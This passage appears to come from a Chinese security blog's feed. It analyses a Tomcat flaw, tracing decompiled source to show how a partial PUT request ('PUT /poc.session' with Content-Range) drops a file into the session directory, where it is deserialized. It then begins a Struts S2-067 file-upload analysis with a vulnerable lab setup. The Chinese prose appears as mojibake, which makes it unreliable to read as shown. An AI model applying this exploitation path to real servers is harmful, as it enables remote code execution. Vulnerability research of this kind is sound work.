class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getManager().getContext();</span><br><span class="line">        <span class="type">Log</span> <span class="variable">contextLog</span> <span class="operator">=</span> context.getLogger();</span><br><span class="line">        <span class="keyword">if</span> (contextLog.isDebugEnabled()) &#123;</span><br><span class="line">            contextLog.debug(sm.getString(<span class="built_in">this</span>.getStoreName() + <span class="string">&quot;.loading&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id, file.getAbsolutePath()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">oldThreadContextCL</span> <span class="operator">=</span> context.bind(Globals.IS_SECURITY_ENABLED, (ClassLoader)<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Object ois;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file.getAbsolutePath());</span><br><span class="line"></span><br><span class="line">                StandardSession var9;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="built_in">this</span>.getObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">StandardSession</span> <span class="variable">session</span> <span class="operator">=</span> (StandardSession)<span class="built_in">this</span>.manager.createEmptySession();</span><br><span class="line">                        session.readObjectData(ois);</span><br><span class="line">                        session.setManager(<span class="built_in">this</span>.manager);</span><br><span class="line">                        var9 = session;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var19) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (ois != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ois.close();</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable var18) &#123;</span><br><span class="line">                                var19.addSuppressed(var18);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">throw</span> var19;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (ois != <span class="literal">null</span>) &#123;</span><br><span class="line">                        ois.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var20) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        fis.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var17) &#123;</span><br><span class="line">                        var20.addSuppressed(var17);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">throw</span> var20;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                fis.close();</span><br><span class="line">                <span class="keyword">return</span> var9;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (FileNotFoundException var21) &#123;</span><br><span class="line">                <span class="keyword">if</span> (contextLog.isDebugEnabled()) &#123;</span><br><span class="line">                    contextLog.debug(<span class="string">&quot;No persisted data file found&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ois = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            context.unbind(Globals.IS_SECURITY_ENABLED, oldThreadContextCL);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Session)ois;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“çœ‹å‡ºè¿™é‡Œæ˜¯åœ¨ååºåˆ—åŒ– session æ–‡ä»¶ä¸­çš„åºåˆ—åŒ–æµï¼Œå› æ­¤åªè¦å¯æ§ session æ–‡ä»¶çš„å†…å®¹å°±å¯ä»¥ååºåˆ—åŒ–å¯æ§çš„æ•°æ®ï¼Œå½“ç¯å¢ƒå­˜åœ¨æœ‰æ¼æ´çš„ä¾èµ–æ—¶å°±å¯ä»¥å®ç°åˆ©ç”¨</p><h2 id="PUT-é»˜è®¤å†™å…¥åœ¨-Web-ç›®å½•ï¼Œæ€ä¹ˆå†™å…¥åˆ°-session-æ–‡ä»¶å­˜å‚¨çš„ä½ç½®"><a href="#PUT-é»˜è®¤å†™å…¥åœ¨-Web-ç›®å½•ï¼Œæ€ä¹ˆå†™å…¥åˆ°-session-æ–‡ä»¶å­˜å‚¨çš„ä½ç½®" class="headerlink" title="PUT é»˜è®¤å†™å…¥åœ¨ Web ç›®å½•ï¼Œæ€ä¹ˆå†™å…¥åˆ° session æ–‡ä»¶å­˜å‚¨çš„ä½ç½®"></a>PUT é»˜è®¤å†™å…¥åœ¨ Web ç›®å½•ï¼Œæ€ä¹ˆå†™å…¥åˆ° session æ–‡ä»¶å­˜å‚¨çš„ä½ç½®</h2><p>è¿™é‡Œå°±éœ€è¦è·Ÿè¿› PUT å¤„ç†ç›¸å…³çš„ä»£ç äº†ï¼Œå¯ä»¥å‚è€ƒ CVE-2024-50379 æ¼æ´å¤ç°æ–‡ç« çš„ç›¸å…³èµ„æ–™</p><p>è·Ÿè¿›<code>org.apache.catalina.servlets.DefaultServlet#doPut</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPut</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.readOnly) &#123;</span><br><span class="line">            <span class="built_in">this</span>.sendNotAllowed(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="built_in">this</span>.getRelativePath(req);</span><br><span class="line">            <span class="type">WebResource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="built_in">this</span>.resources.getResource(path);</span><br><span class="line">            <span class="type">Range</span> <span class="variable">range</span> <span class="operator">=</span> <span class="built_in">this</span>.parseContentRange(req, resp);</span><br><span class="line">            <span class="keyword">if</span> (range != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">resourceInputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (range == IGNORE) &#123;</span><br><span class="line">                        resourceInputStream = req.getInputStream();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> <span class="built_in">this</span>.executePartialPut(req, range, path);</span><br><span class="line">                        resourceInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(contentFile);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.resources.write(path, resourceInputStream, <span class="literal">true</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (resource.exists()) &#123;</span><br><span class="line">                            resp.setStatus(<span class="number">204</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            resp.setStatus(<span class="number">201</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        resp.sendError(<span class="number">409</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (resourceInputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            resourceInputStream.close();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException var13) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°<code>this.parseContentRange()</code>è¿™ä¸ªå‡½æ•°ï¼Œçœ‹çœ‹åœ¨å¹²å˜›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Range <span class="title function_">parseContentRange</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">contentRangeHeader</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Content-Range&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (contentRangeHeader == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> IGNORE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.allowPartialPut) &#123;</span><br><span class="line">        response.sendError(<span class="number">400</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ContentRange</span> <span class="variable">contentRange</span> <span class="operator">=</span> ContentRange.parse(<span class="keyword">new</span> <span class="title class_">StringReader</span>(contentRangeHeader));</span><br><span class="line">        <span class="keyword">if</span> (contentRange == <span class="literal">null</span>) &#123;</span><br><span class="line">            response.sendError(<span class="number">400</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!contentRange.getUnits().equals(<span class="string">&quot;bytes&quot;</span>)) &#123;</span><br><span class="line">            response.sendError(<span class="number">400</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Range</span> <span class="variable">range</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Range</span>();</span><br><span class="line">            range.start = contentRange.getStart();</span><br><span class="line">            range.end = contentRange.getEnd();</span><br><span class="line">            range.length = contentRange.getLength();</span><br><span class="line">            <span class="keyword">if</span> (!range.validate()) &#123;</span><br><span class="line">                response.sendError(<span class="number">400</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> range;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºè¿™é‡Œæ¥å—äº† Content-Range è¯·æ±‚å¤´ï¼Œè¿™æ˜¯ä»€ä¹ˆï¼Ÿé—®é—® ai</p><p><img src="https://s2.loli.net/2025/03/25/dOW5Kmly6MxYG7r.png" alt="img"></p><p>è¿™å°±å¾ˆæœ‰æ„æ€äº†ï¼Œç”¨äºå¤§æ–‡ä»¶åˆ†æ®µä¼ è¾“çš„ï¼Œé‚£è¿˜æ²¡ä¼ è¾“å®Œçš„æ–‡ä»¶åˆ‡ç‰‡ä¼šç¼“å­˜åœ¨å“ªå‘¢ï¼Œæ²¡é”™ï¼Œè¿˜çœŸå°±åœ¨ session æ–‡ä»¶å­˜æ”¾çš„åœ°æ–¹</p><p>å›åˆ°<code>org.apache.catalina.servlets.DefaultServlet#doPut</code>ï¼Œåœ¨è§£æå®Œ Content-Range è¯·æ±‚å¤´åç»™äº† range è¿™ä¸ªå˜é‡ï¼Œå½“<code>range != IGNORE</code>å°±ä¼šè°ƒç”¨<code>org.apache.catalina.servlets.DefaultServlet#executePartialPut()</code>ï¼Œè¯¥æ–¹æ³•å‚æ•°ä¸­ä¹Ÿå«æœ‰range å˜é‡</p><p>è·Ÿè¿› <code>org.apache.catalina.servlets.DefaultServlet#executePartialPut()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> File <span class="title function_">executePartialPut</span><span class="params">(HttpServletRequest req, Range range, String path)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">tempDir</span> <span class="operator">=</span> (File)<span class="built_in">this</span>.getServletContext().getAttribute(<span class="string">&quot;javax.servlet.context.tempdir&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">convertedResourcePath</span> <span class="operator">=</span> path.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(tempDir, convertedResourcePath);</span><br><span class="line">        <span class="keyword">if</span> (contentFile.createNewFile()) &#123;</span><br><span class="line">            contentFile.deleteOnExit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">randAccessContentFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(contentFile, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebResource</span> <span class="variable">oldResource</span> <span class="operator">=</span> <span class="built_in">this</span>.resources.getResource(path);</span><br><span class="line">            <span class="keyword">if</span> (oldResource.isFile()) &#123;</span><br><span class="line">                <span class="type">BufferedInputStream</span> <span class="variable">bufOldRevStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(oldResource.getInputStream(), <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">byte</span>[] copyBuffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> numBytesRead;</span><br><span class="line">                    <span class="keyword">while</span>((numBytesRead = bufOldRevStream.read(copyBuffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                        randAccessContentFile.write(copyBuffer, <span class="number">0</span>, numBytesRead);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var17) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        bufOldRevStream.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var16) &#123;</span><br><span class="line">                        var17.addSuppressed(var16);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">throw</span> var17;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                bufOldRevStream.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            randAccessContentFile.setLength(range.length);</span><br><span class="line">            randAccessContentFile.seek(range.start);</span><br><span class="line">            <span class="type">byte</span>[] transferBuffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">requestBufInStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(req.getInputStream(), <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> numBytesRead;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span>((numBytesRead = requestBufInStream.read(transferBuffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    randAccessContentFile.write(transferBuffer, <span class="number">0</span>, numBytesRead);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var18) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    requestBufInStream.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var15) &#123;</span><br><span class="line">                    var18.addSuppressed(var15);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> var18;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            requestBufInStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var19) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                randAccessContentFile.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var14) &#123;</span><br><span class="line">                var19.addSuppressed(var14);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> var19;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        randAccessContentFile.close();</span><br><span class="line">        <span class="keyword">return</span> contentFile;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç¥å¥‡çš„å‘ç°ï¼Œè¿™é‡Œè·å–çš„è·¯å¾„ä¹Ÿæ˜¯ä»<code>javax.servlet.context.tempdir</code>è·å–çš„ï¼Œé‚£ä¹ˆåœ¨é»˜è®¤æƒ…å†µä¸‹ç›¸åŒ servlet çš„ä¸´æ—¶å·¥ä½œç›®å½•è‡ªç„¶ä¹Ÿç›¸åŒ</p><p>ç»§ç»­çœ‹ï¼Œè¿™é‡Œä¼šå°† path ä¸­ <code>/</code>æ›¿æ¢ä¸º <code>.</code>ï¼Œè€Œ path åˆ™æ˜¯è¯·æ±‚çš„è·¯å¾„ï¼Œæ‰€ä»¥å¦‚æœè¯·æ±‚ä¸º <code>PUT /poc.session</code>åˆ°è¿™å¤„ç†åçš„convertedResourcePath å³ <code>.poc.session</code>ï¼Œè¿™é‡Œ<code>contentFile.deleteOnExit()</code>å¹¶ä¸æ˜¯ç«‹å³åˆ é™¤ï¼Œè€Œæ˜¯æ ‡è®°åˆ é™¤ï¼Œåœ¨é€€å‡º jvm æ—¶ä¼šè§¦å‘ hookï¼Œåˆ é™¤è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ã€‚ç„¶åçš„é€»è¾‘å°±ä¼šè·å–è¯·æ±‚åŒ…çš„ body æ ¹æ® range çš„åç§»é‡å†™å…¥åˆ°è¯¥æ–‡ä»¶ä¸­ï¼Œå¹¶è¿”å›è¯¥ File å¯¹è±¡ã€‚</p><p>è¿”å›åçš„è°ƒç”¨å°±æ˜¯å†™å…¥åˆ° web ç›®å½•ä¸‹çš„å¯¹åº”è·¯å¾„ä¸‹</p><p>å› æ­¤ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ session å­˜æ”¾çš„ç›®å½•å†™å…¥æºå¸¦æ¶æ„åºåˆ—åŒ–æµçš„ session æ–‡ä»¶ã€‚åœ¨è¯·æ±‚ä¸­æºå¸¦ session æ—¶å°±ä¼šå¯»æ‰¾å¯¹åº” session æ–‡ä»¶ï¼Œå¹¶ååºåˆ—åŒ–æ¶æ„æ•°æ®ï¼Œè¾¾åˆ°åˆ©ç”¨ç›®çš„ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ€»çš„æ¥è¯´ï¼Œåˆ©ç”¨æ¡ä»¶æ˜¯ç›¸å½“è‹›åˆ»çš„ï¼Œä¸ä»…å¾—å¼€å¯ PUT è¿˜å¾—å¼€å¯ Tomcat çš„ session æ–‡ä»¶æŒä¹…åŒ–ï¼Œç¯å¢ƒä¸­è¿˜å¾—å­˜åœ¨å¯ååºåˆ—åŒ–åˆ©ç”¨çš„ä¾èµ–åŒ…ã€‚å®é™…ç¯å¢ƒå¾ˆéš¾é‡åˆ°ï¼Œä½†æ€è·¯è¿˜æ˜¯å¾ˆå·§å¦™çš„ã€‚</p><p>äº†è§£ä¸å¤šï¼Œå¦‚æœæœ‰åˆ†æå‡ºé”™çš„åœ°æ–¹ï¼Œè¯·å„ä½å¤§ç‰›å¤šå¤šæŒ‡ç‚¹ï¼</p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Struts S2-067 æ¼æ´åˆ†æ</title>
      <link href="/2024/12/20/Apache%20Struts%20S2-067%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/12/20/Apache%20Struts%20S2-067%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><a href="https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/">Apache-Struts2-æ–‡ä»¶ä¸Šä¼ é€»è¾‘ç»•è¿‡-CVE-2024-53677-S2-067 - y4tacker</a></p><h1 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h1><p>Apache Struts æ˜¯ä¸€ä¸ªå¼€æºçš„ã€ç”¨äºæ„å»ºä¼ä¸šçº§Java Webåº”ç”¨çš„MVCæ¡†æ¶ã€‚2024å¹´12æœˆï¼ŒApache å®˜æ–¹æŠ«éœ² CVE-2024-53677 Apache Struts FileUploadInterceptor æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚åœ¨å—å½±å“ç‰ˆæœ¬ä¸­ï¼Œè‹¥ä»£ç ä¸­ä½¿ç”¨äº†FileUploadInterceptorï¼Œå½“è¿›è¡Œæ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œæ”»å‡»è€…å¯èƒ½æ„é€ æ¶æ„è¯·æ±‚åˆ©ç”¨ç›®å½•éå†ç­‰ä¸Šä¼ æ–‡ä»¶è‡³å…¶ä»–ç›®å½•ï¼Œåœ¨ç‰¹å®šåœºæ™¯ä¸‹å¯èƒ½é€ æˆä»£ç æ‰§è¡Œã€‚</p><h1 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h1><p>Struts 2.0.0 - Struts 2.3.37</p><p>Struts 2.5.0 - Struts 2.5.33</p><p>Struts 6.0.0 - Struts 6.3.0.2</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p><a href="https://github.com/proudwind/struts2_vulns/tree/master/s2vuls">https://github.com/proudwind/struts2_vulns/tree/master/s2vuls</a></p><p>ç¬¬ä¸€æ¬¡å¤ç°strutsçš„æ¼æ´ï¼Œå€ŸåŠ©äº†è¿™ä¸ªé¡¹ç›®æ­å»ºç¯å¢ƒï¼ˆè‡ªå·±å°è¯•ä»é›¶æ­ç¯å¢ƒå‘ç°è¾¾ä¸åˆ°é¢„æœŸæ•ˆæœï¼Œè®¿é—®<code>upload.action</code>è¿”å›404ï¼Œæ€ªï¼‰</p><p>cloneä¸‹æ¥è¿™ä¸ªç›®å½•ï¼Œç„¶åæ ¹æ®éœ€è¦å¢åŠ è‡ªå·±çš„ä»£ç å³å¯</p><p>ä¿®æ”¹pom.xmlï¼Œä¾èµ–æ›´æ¢ä¸ºæ¼æ´ç‰ˆæœ¬ï¼Œè¿™é‡Œé€‰ç”¨6.3.0.2</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.3.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å®šä¹‰ä¸€ä¸ªUploadActionç±»</p><p><img src="https://s2.loli.net/2024/12/20/RxGv7CV6FIjEczN.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.ph0ebus.s2067.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> File upload;</span><br><span class="line">    <span class="keyword">private</span> String 